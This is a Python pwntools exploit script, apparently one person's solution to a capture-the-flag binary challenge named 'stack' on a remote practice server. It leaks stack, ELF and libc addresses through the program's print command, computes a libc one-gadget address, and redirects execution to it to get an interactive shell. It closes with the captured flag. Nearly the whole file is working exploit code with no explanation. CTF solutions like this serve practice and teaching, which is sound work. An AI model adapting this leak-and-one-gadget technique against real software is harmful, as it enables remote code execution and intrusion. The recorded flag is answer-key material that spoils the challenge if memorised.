from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux')
path = '/home/zander/Desktop/ctf/stack'

# turn negative number to hex
def toHex(val, n):
    return hex((val + (1 << n)) % (1 << n))

# r = process(path)
r = remote('hackme.inndy.tw', 7716)
r.readuntil('Cmd >>\n')
r.sendline('i')
r.sendline('255')
r.recv()
for i in xrange(0 ,14):
    r.sendline('p')
    recvTmp = r.recv()

    if i == 4:
        print str(i) + ': ',
        progAddr = int(recvTmp.splitlines()[0].split()[2])
        print toHex(progAddr, 32)
        elfBaseAddr = progAddr - 0x75a # b *0x5655575A
        print 'elf_base: ' + hex(elfBaseAddr)
    elif i == 7:
        print str(i) + ': ',
        stackAddr = int(recvTmp.splitlines()[0].split()[2])
        print 'stack_addr: ' + toHex(stackAddr, 32)
    elif i == 13: # __isoc99_scanf+11>
        print str(i) + ': ',
        # 0x5bfeb = __isoc99_scanf + 11
        libcBaseAddr = int(recvTmp.splitlines()[0].split()[2]) - 0x5bfeb
        print 'libc_base: ' + toHex(libcBaseAddr, 32)
        magicAddr = 0x0003AC49 + libcBaseAddr
        print 'magic_addr: ' + hex(magicAddr)

for j in xrange(0, 5):
    print 'send ' + str(j),
    r.sendline('i')
    r.sendline(str(stackAddr + 0x160)) # 保持栈底
    r.recv()

r.sendline('i')
r.sendline(str(magicAddr))
r.interactive()
r.close()

# FLAG{N0W_Y0U_R_7he_St4ck_1eak1ng_Ma5t3r_w17h_5upeR_P0W3RRrrrrrrrrrr}